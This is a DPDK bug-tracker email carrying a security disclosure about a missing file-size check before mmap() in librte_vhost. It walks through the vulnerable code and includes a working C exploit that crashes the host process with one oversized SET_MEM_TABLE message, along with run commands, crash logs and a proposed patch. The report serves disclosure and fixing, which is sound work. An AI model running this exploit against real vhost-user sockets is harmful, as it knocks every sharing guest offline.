Return-Path: <dev-bounces@dpdk.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from mails.dpdk.org (mails.dpdk.org [217.70.189.124])
	by smtp.lore.kernel.org (Postfix) with ESMTP id B62E7C61DBD
	for <dpdk-dev@archiver.kernel.org>; Fri, 28 Aug 2026 12:52:54 +0000 (UTC)
Received: from mails.dpdk.org (localhost [127.0.0.1])
	by mails.dpdk.org (Postfix) with ESMTP id 9F2E440151;
	Fri, 28 Aug 2026 14:52:53 +0200 (CEST)
Received: from inbox.dpdk.org (inbox.dpdk.org [95.142.172.178])
 by mails.dpdk.org (Postfix) with ESMTP id 9B3CF40150
 for <dev@dpdk.org>; Fri, 28 Aug 2026 14:52:52 +0200 (CEST)
Received: by inbox.dpdk.org (Postfix, from userid 33)
 id 6AC494CF7D; Fri, 28 Aug 2026 14:52:52 +0200 (CEST)
From: bugzilla@dpdk.org
To: dev@dpdk.org
Subject: [DPDK/vhost/virtio Bug 2002] vhost memory size validation before mmap
Date: Fri, 28 Aug 2026 12:52:52 +0000
X-Bugzilla-Reason: AssignedTo
X-Bugzilla-Type: new
X-Bugzilla-Watch-Reason: None
X-Bugzilla-Product: DPDK
X-Bugzilla-Component: vhost/virtio
X-Bugzilla-Version: unspecified
X-Bugzilla-Keywords: 
X-Bugzilla-Severity: normal
X-Bugzilla-Who: thomas@monjalon.net
X-Bugzilla-Status: UNCONFIRMED
X-Bugzilla-Resolution: 
X-Bugzilla-Priority: Normal
X-Bugzilla-Assigned-To: dev@dpdk.org
X-Bugzilla-Target-Milestone: ---
X-Bugzilla-Flags: 
X-Bugzilla-Changed-Fields: bug_id short_desc product version rep_platform
 op_sys bug_status bug_severity priority component assigned_to reporter
 target_milestone bug_group
Message-ID: <bug-2002-3@https.bugs.dpdk.org/>
Content-Transfer-Encoding: quoted-printable
Content-Type: text/plain; charset=UTF-8
X-Bugzilla-URL: https://bugs.dpdk.org/
Auto-Submitted: auto-generated
X-Auto-Response-Suppress: All
MIME-Version: 1.0
X-BeenThere: dev@dpdk.org
X-Mailman-Version: 2.1.29
Precedence: list
List-Id: DPDK patches and discussions <dev.dpdk.org>
List-Unsubscribe: <https://mails.dpdk.org/options/dev>,
 <mailto:dev-request@dpdk.org?subject=unsubscribe>
List-Archive: <http://mails.dpdk.org/archives/dev/>
List-Post: <mailto:dev@dpdk.org>
List-Help: <mailto:dev-request@dpdk.org?subject=help>
List-Subscribe: <https://mails.dpdk.org/listinfo/dev>,
 <mailto:dev-request@dpdk.org?subject=subscribe>
Errors-To: dev-bounces@dpdk.org

https://bugs.dpdk.org/show_bug.cgi?id=3D2002

            Bug ID: 2002
           Summary: vhost memory size validation before mmap
           Product: DPDK
           Version: unspecified
          Hardware: All
                OS: All
            Status: UNCONFIRMED
          Severity: normal
          Priority: Normal
         Component: vhost/virtio
          Assignee: dev@dpdk.org
          Reporter: thomas@monjalon.net
  Target Milestone: ---
             Group: security

Report date: 2026-04-09
Reported by: Don Salvatore Nero <hemo40047@gmail.com>

Dear DPDK Security Team

Security Vulnerability Report

DPDK librte_vhost =E2=80=94 Memory Size Validation Missing Before mmap()

Executive Summary

A Denial-of-Service vulnerability was discovered in DPDK version 25.11.0
(stable) in the librte_vhost library. The function vhost_user_mmap_region()=
 in
lib/vhost/vhost_user.c calls mmap() with a size value supplied directly by =
an
untrusted guest without validating it against the actual file size (st_size=
).
This allows a malicious guest to cause a segmentation fault (SIGBUS/segfaul=
t)
that crashes the entire DPDK host process.

Basic Information

Element Details

 Discovered by:  Don Salvatori Nero

Affected Version DPDK 25.11.0 (stable)

Affected File lib/vhost/vhost_user.c

Affected Functions vhost_user_mmap_region(), vhost_user_set_mem_table()

Vulnerability Class CWE-20 =E2=80=94 Improper Input Validation

Impact Denial of Service =E2=80=94 full crash of the DPDK host process

Attack Vector Malicious guest via vhost-user Unix socket

Discovery Methodology

The vulnerability was identified through a comprehensive source code audit =
of
the DPDK vhost-user implementation. The analysis traced the end-to-end data
flow from untrusted guest input to the critical mmap() system call,
systematically examining each validation point along the path. The
investigation involved reviewing message routing mechanisms, memory region
parsing logic, and the absence of file size verification prior to memory
mapping operations.

1. Entry Point =E2=80=94 Message Routing

The first step was identifying how guest messages are routed in
lib/vhost/vhost_user.c:

// lib/vhost/vhost_user.c:73

VHOST_MESSAGE_HANDLER(VHOST_USER_SET_MEM_TABLE, vhost_user_set_mem_table, t=
rue,
true)

This line confirms that any guest connection can send VHOST_USER_SET_MEM_TA=
BLE
and it will be routed directly to vhost_user_set_mem_table().

2. First Function =E2=80=94 vhost_user_set_mem_table()

Location: lib/vhost/vhost_user.c:1386

The function reads guest-supplied memory region data and copies it without
validating memory_size:

// lib/vhost/vhost_user.c:1465-1488

for (i =3D 0; i < memory->nregions; i++) {

    reg =3D &dev->mem->regions[i];

    reg->guest_phys_addr =3D memory->regions[i].guest_phys_addr;

    reg->guest_user_addr =3D memory->regions[i].userspace_addr;

    reg->size =3D memory->regions[i].memory_size;      // =E2=86=90 guest v=
alue, no check

    reg->fd =3D ctx->fds[i];

    ctx->fds[i] =3D -1;

    mmap_offset =3D memory->regions[i].mmap_offset;



    if (vhost_user_mmap_region(dev, reg, mmap_offset) < 0) {

        goto free_mem_table;

    }

}

What was validated: only nregions count:

// lib/vhost/vhost_user.c:1399

if (memory->nregions > VHOST_MEMORY_MAX_NREGIONS) {

    goto close_msg_fds;

}

What was NOT validated: memory_size against the actual file size of
ctx->fds[i].

3. Second Function =E2=80=94 vhost_user_mmap_region()

Location: lib/vhost/vhost_user.c:1289

Full function analysis:

vhost_user_mmap_region(struct virtio_net *dev, struct rte_vhost_mem_region
*region,

                       uint64_t mmap_offset)

{

    void *mmap_addr;

    uint64_t mmap_size;

    uint64_t alignment;

    int populate;

    // CHECK 1: integer overflow =E2=80=94 CORRECT

    if (mmap_offset >=3D -region->size) {

        return -1;

    }

    // mmap_size comes entirely from guest

    mmap_size =3D region->size + mmap_offset;

    // get_blk_size reads st_blksize =E2=80=94 NOT st_size

    alignment =3D get_blk_size(region->fd);

    if (alignment =3D=3D (uint64_t)-1) {

        return -1;

    }

    // align size upward

    mmap_size =3D RTE_ALIGN_CEIL(mmap_size, alignment);

    // CHECK 2: zero overflow =E2=80=94 CORRECT

    if (mmap_size =3D=3D 0) {

        return -1;

    }

    // =E2=86=90 NO CHECK HERE: mmap_size vs actual file st_size

    populate =3D dev->async_copy ? MAP_POPULATE : 0;

    // mmap called with guest-controlled size

    mmap_addr =3D mmap(NULL, mmap_size, PROT_READ | PROT_WRITE,

                     MAP_SHARED | populate, region->fd, 0);

    // only MAP_FAILED is checked =E2=80=94 succeeds with oversized mapping

    if (mmap_addr =3D=3D MAP_FAILED) {

        return -1;

    }

    region->mmap_addr =3D mmap_addr;

    region->mmap_size =3D mmap_size;

    region->host_user_addr =3D (uint64_t)(uintptr_t)mmap_addr + mmap_offset;

    return 0;

}

4. Third Function =E2=80=94 get_blk_size()

Location: lib/vhost/vhost_user.c:165

get_blk_size(int fd)

{

    struct stat stat;

    int ret;

    ret =3D fstat(fd, &stat);

    return ret =3D=3D -1 ? (uint64_t)-1 : (uint64_t)stat.st_blksize;

}

Critical finding: fstat() is called but only st_blksize (preferred I/O block
size) is returned. st_size (actual file size) is never read anywhere in
lib/vhost/vhost_user.c:

grep -rn "st_size" lib/vhost/vhost_user.c

# =E2=86=92 no output

5. Confirmation =E2=80=94 No Fix in Git History

git log --oneline -- lib/vhost/vhost_user.c | \

grep -i "mmap\|fix\|CVE\|size\|overflow" | head -10

Output:

bdd96d8ac7 vhost: fix offset while mapping log base address

47358f8f50 vhost: fix virtqueue access lock check for handlers

3bb7df6a95 vhost: fix vring addr update with vDPA

...

No commit in the entire history addresses missing st_size validation before
mmap().

6. Root Cause Summary

Data flow from guest to crash:

Guest sends VHOST_USER_SET_MEM_TABLE

    =E2=86=93

vhost_user_set_mem_table()

    reg->size =3D memory->regions[i].memory_size   =E2=86=90 guest value, n=
o size check

    reg->fd =3D ctx->fds[i]                        =E2=86=90 guest fd

    =E2=86=93

vhost_user_mmap_region()

    mmap_size =3D region->size + mmap_offset       =E2=86=90 still guest va=
lue

    get_blk_size(fd) =E2=86=92 st_blksize only           =E2=86=90 NOT st_s=
ize

    mmap(NULL, mmap_size, ..., fd, 0)            =E2=86=90 oversized mappin=
g succeeds

    =E2=86=93

Later access to address beyond real file size

    =E2=86=93

Linux kernel sends SIGBUS =E2=86=92 segfault =E2=86=92 DPDK process crashes

7. Proof of Concept

Environment Setup

=C2=B7 DPDK version: 25.11.0 stable

=C2=B7 OS: Ubuntu 22.04.5 LTS (Linux 5.15.0-122-generic x86_64)

Step 1 =E2=80=94 Build and run DPDK testpmd

sudo ./build/app/dpdk-testpmd \

  -l 0-1 --in-memory --no-pci \

  --vdev 'net_vhost0,iface=3D/tmp/vhost-net,client=3D0' -- -i

Output confirmed DPDK running and listening:

VHOST_CONFIG: (/tmp/vhost-net) vhost-user server: socket created, fd: 201

VHOST_CONFIG: (/tmp/vhost-net) binding succeeded

Step 2 =E2=80=94 Exploit code

#include=20

#include=20

#include=20

#include=20

#include=20

#include=20

#include=20

#include=20

#include=20

#include=20

#define VHOST_USER_HDR_SIZE 12

#define VHOST_USER_MEMORY_MAX_NREGIONS 8

typedef enum VhostUserRequest {

    VHOST_USER_NONE =3D 0,

    VHOST_USER_GET_FEATURES =3D 1,

    VHOST_USER_SET_FEATURES =3D 2,

    VHOST_USER_SET_OWNER =3D 3,

    VHOST_USER_SET_MEM_TABLE =3D 5,

} VhostUserRequest;

struct VhostUserMemoryRegion {

    uint64_t guest_phys_addr;

    uint64_t memory_size;

    uint64_t userspace_addr;

    uint64_t mmap_offset;

};

struct VhostUserMemory {

    uint32_t nregions;

    uint32_t padding;

    struct VhostUserMemoryRegion regions[VHOST_USER_MEMORY_MAX_NREGIONS];

};

struct VhostUserMsg {

    uint32_t request;

    uint32_t flags;

    uint32_t size;

    union {

        uint64_t u64;

        struct VhostUserMemory memory;

    } payload;

} __attribute__((packed));

static int send_vhost_message(int sockfd, struct VhostUserMsg *msg, int fd)=
 {

    struct msghdr msgh;

    struct iovec iov;

    char control[CMSG_SPACE(sizeof(int))];



    memset(&msgh, 0, sizeof(msgh));

    iov.iov_base =3D msg;

    iov.iov_len =3D VHOST_USER_HDR_SIZE + msg->size;

    msgh.msg_iov =3D &iov;

    msgh.msg_iovlen =3D 1;



    if (fd !=3D -1) {

        msgh.msg_control =3D control;

        msgh.msg_controllen =3D sizeof(control);

        struct cmsghdr *cmsg =3D CMSG_FIRSTHDR(&msgh);

        cmsg->cmsg_len =3D CMSG_LEN(sizeof(int));

        cmsg->cmsg_level =3D SOL_SOCKET;

        cmsg->cmsg_type =3D SCM_RIGHTS;

        memcpy(CMSG_DATA(cmsg), &fd, sizeof(int));

    }



    if (sendmsg(sockfd, &msgh, 0) < 0) {

        perror("Failed to send vhost message");

        return -1;

    }

    return 0;

}

int main(int argc, char *argv[]) {

    if (argc < 2) {

        printf("Usage: %s \n", argv[0]);

        return -1;

    }



    int sockfd;

    struct sockaddr_un addr;

    char *socket_path =3D argv[1];



    // Create small trap file =E2=80=94 real size 1MB

    const char *shm_path =3D "/tmp/fake_mem";

    int mem_fd =3D open(shm_path, O_RDWR | O_CREAT | O_TRUNC, 0666);

    ftruncate(mem_fd, 1024 * 1024);



    if ((sockfd =3D socket(AF_UNIX, SOCK_STREAM, 0)) =3D=3D -1) {

        perror("Socket error");

        return -1;

    }



    memset(&addr, 0, sizeof(addr));

    addr.sun_family =3D AF_UNIX;

    strncpy(addr.sun_path, socket_path, sizeof(addr.sun_path) - 1);



    printf("[*] Connecting to DPDK vhost socket: %s\n", socket_path);

    if (connect(sockfd, (struct sockaddr *)&addr, sizeof(addr)) =3D=3D -1) {

        perror("Connect error");

        return -1;

    }



    struct VhostUserMsg msg;



    // Step 1: SET_OWNER

    memset(&msg, 0, sizeof(msg));

    msg.request =3D VHOST_USER_SET_OWNER;

    msg.size =3D 0;

    send_vhost_message(sockfd, &msg, -1);

    printf("[+] Sent VHOST_USER_SET_OWNER\n");



    // Step 2: Malicious SET_MEM_TABLE

    memset(&msg, 0, sizeof(msg));

    msg.request =3D VHOST_USER_SET_MEM_TABLE;

    msg.flags =3D 0x1;

    msg.payload.memory.nregions =3D 1;

    msg.payload.memory.regions[0].guest_phys_addr =3D 0x0;

    // Claim 10GB =E2=80=94 real file is 1MB

    msg.payload.memory.regions[0].memory_size =3D 10ULL * 1024 * 1024 * 102=
4;

    msg.payload.memory.regions[0].userspace_addr =3D 0x4000000000ULL;

    msg.payload.memory.regions[0].mmap_offset =3D 0;

    msg.size =3D sizeof(struct VhostUserMemory);



    printf("[!] Sending malicious SET_MEM_TABLE (claimed: 10GB, actual:
1MB)\n");

    send_vhost_message(sockfd, &msg, mem_fd);

    printf("[+] Exploit sent. Waiting...\n");



    sleep(2);



    char buf[1];

    if (read(sockfd, buf, 1) =3D=3D 0)

        printf("[SUCCESS] DPDK crashed!\n");

    else

        printf("[FAILURE] DPDK still running.\n");



    close(sockfd);

    close(mem_fd);

    unlink(shm_path);

    return 0;

}

Step 3 =E2=80=94 Compile and run

gcc vhost_exploit.c -o vhost_exploit

sudo ./vhost_exploit /tmp/vhost-net

Step 4 =E2=80=94 DPDK log confirms oversized mapping accepted

VHOST_CONFIG: (/tmp/vhost-net) read message VHOST_USER_SET_MEM_TABLE

VHOST_CONFIG: (/tmp/vhost-net) guest memory region size: 0x280000000

VHOST_CONFIG: (/tmp/vhost-net) mmap addr : 0x7ffd68000000

VHOST_CONFIG: (/tmp/vhost-net) mmap size : 0x280000000

VHOST_CONFIG: (/tmp/vhost-net) mmap align: 0x1000

VHOST_CONFIG: (/tmp/vhost-net) mmap off : 0x0

mmap_size =3D 0x280000000 =3D 10GB =E2=80=94 accepted without error.

Step 5 =E2=80=94 Crash confirmed

dmesg | grep -i "testpmd" | tail -n 5

[1836590.377750] dpdk-vhost-evt[1307789]: segfault at 10187cad8 ip
0000555555a44be1 sp 00007fffeeff7470 error 4 in
dpdk-testpmd[555555714000+2595000]

error 4 =3D page not present =3D access beyond real file boundary.

8. Impact

Any process that can connect to the vhost-user Unix socket =E2=80=94 includ=
ing any
guest VM or container with access to it =E2=80=94 can crash the entire DPDK=
 host
process with a single message. All other guests sharing the same DPDK insta=
nce
lose network connectivity instantly.

9. Recommended Fix

In vhost_user_mmap_region(), after calling fstat(), add a check comparing
mmap_size against st_size:

struct stat file_stat;

if (fstat(region->fd, &file_stat) =3D=3D -1) {

    return -1;

}

if (mmap_size > (uint64_t)file_stat.st_size) {

    VHOST_CONFIG_LOG(dev->ifname, ERR,

                     "mmap size (0x%" PRIx64 ") exceeds file size (0x%" PRI=
x64
")",

                     mmap_size, (uint64_t)file_stat.st_size);

    return -1;

}

--=20
You are receiving this mail because:
You are the assignee for the bug.=
